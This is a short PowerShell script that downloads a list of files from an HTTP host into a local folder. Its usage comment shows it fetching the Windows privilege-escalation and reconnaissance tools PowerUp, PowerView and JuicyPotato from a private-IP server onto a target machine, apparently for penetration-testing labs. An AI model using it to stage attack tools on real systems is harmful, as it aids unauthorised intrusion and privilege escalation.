# MultiFileDownload.ps1
# if on cmd type powershell
# .\MultiFileDownload.ps1 -HostUrl "http://192.168.119.172:8080" -FileNames "PowerUp.ps1", "PowerView.ps1", "JuicyPotato.exe" -Destination "C:\Users\Public\"

param (
    [string]$HostUrl,
    [string[]]$FileNames,
    [string]$Destination = "./Downloads"
)

# Display ASCII art with color
Write-Host @"
`e[1;36m
 ,---,---,---,---,---,---,---,---,---,---,---,---,
| Y | a | v | u | z |   | S | a | h | b | a | z |   |
|---'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-|
|     ___                                             __
|   /   \           ___ ___   ____ ___  ____   _____/  |_
|   \_   \   ______\  \\  \_/ ___\\  \/  /  _ \ /    \   __\
|   /   /  /_____/  >  <\___ \\___ \>    <\_\ \_\   |  |
|  /___/           /__/ /____/_____/__/\_ \___  /___|  /
|                                       \/    \/     \/
|---,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'-,-'--|
| Y | a | v | u | z |   | S | a | h | b | a | z |   |
 `---'---'---'---'---'---'---'---'---'---'---'---'---'
`e[0m
"@ -ForegroundColor Cyan

# Ensure the destination folder exists
if (-not (Test-Path $Destination)) {
    New-Item -ItemType Directory -Path $Destination | Out-Null
}

# Download files
foreach ($fileName in $FileNames) {
    try {
        $url = "$HostUrl/$fileName"
        $destinationPath = Join-Path $Destination $fileName

        Write-Host "Downloading $url to $destinationPath"
        Invoke-WebRequest -Uri $url -OutFile $destinationPath
        Write-Host "Download complete: $destinationPath"
    }
    catch {
        Write-Host "Error downloading $($url): $($_)"
    }
}
